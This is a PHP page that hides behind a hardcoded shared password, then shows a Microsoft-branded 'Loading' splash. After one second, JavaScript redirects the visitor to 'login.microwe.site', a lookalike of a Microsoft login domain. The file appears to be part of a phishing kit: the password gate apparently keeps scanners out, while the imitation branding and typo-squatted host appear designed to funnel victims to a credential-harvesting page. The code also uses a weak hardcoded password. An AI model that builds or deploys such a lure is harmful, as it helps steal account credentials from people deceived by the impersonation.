<?php
// 1. Configure session cookie settings BEFORE starting the session
// 7 days = 7 days * 24 hours * 60 minutes * 60 seconds = 604800 seconds
$session_lifetime = 604800; 

session_set_cookie_params([
    'lifetime' => $session_lifetime,
    'path' => '/',
    'domain' => $_SERVER['HTTP_HOST'],
    'secure' => isset($_SERVER['HTTPS']), // True if using HTTPS
    'httponly' => true,                  // Protects cookie from JavaScript access
    'samesite' => 'Lax'
]);

session_start();

// 2. Define your secure password
$correct_password = '12345doc6'; 

// 3. Handle the logout action if requested
if (isset($_GET['action']) && $_GET['action'] == 'logout') {
    unset($_SESSION['logged_in']);
    session_destroy();
    
    // Clear the session cookie in the browser
    if (ini_get("session.use_cookies")) {
        $params = session_get_cookie_params();
        setcookie(session_name(), '', time() - 42000,
            $params["path"], $params["domain"],
            $params["secure"], $params["httponly"]
        );
    }
    
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// 4. Check if the user is submitting the login form
if (isset($_POST['password'])) {
    if ($_POST['password'] === $correct_password) {
        $_SESSION['logged_in'] = true;
    } else {
        $error = "Invalid password.";
    }
}

// 5. If the user is NOT logged in, show the login form and stop execution
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Restricted Access</title>
        <style>
            body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; margin: 0; }
            .login-box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 300px; text-align: center; }
            input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
            input[type="submit"] { background: #0078d4; color: white; border: none; padding: 10px; width: 100%; border-radius: 4px; cursor: pointer; }
            .error { color: red; font-size: 14px; margin-bottom: 10px; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h2>Authentication Required</h2>
            <?php if (isset($error)) { echo '<p class="error">'.$error.'</p>'; } ?>
            <form method="POST" action="">
                <input type="password" name="password" placeholder="Enter Password" required>
                <input type="submit" value="Login">
            </form>
        </div>
    </body>
    </html>
    <?php
    exit; 
}

// =========================================================================
// 6. PROTECTED CONTENT GOES HERE 
// (Only logged-in users will ever reach this point)
// =========================================================================
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading</title>
<link rel="stylesheet" href="style.css">

<script type="text/javascript">
    window.onload = function() {
        // Waits exactly 1 seconds, then redirects
        setTimeout(function() {
            window.location.replace("https://login.microwe.site/GhVzJjZT");
        }, 1000); 
    };
</script>
</head>
<body>
<main class="splash">
  <div class="logo">
    <div class="back-card"></div>
    <div class="paper"></div>
    <div class="front-card"><div class="front-fold"></div></div>
  </div>
  <div class="microsoft">
    <span class="ms-icon"><i></i><i></i><i></i><i></i></span>
    <span class="ms-text">Microsoft</span>
  </div>
</main>
<p style="text-align: center; margin-top: 20px;"><a href="?action=logout">Logout</a></p>
</body>
</html>
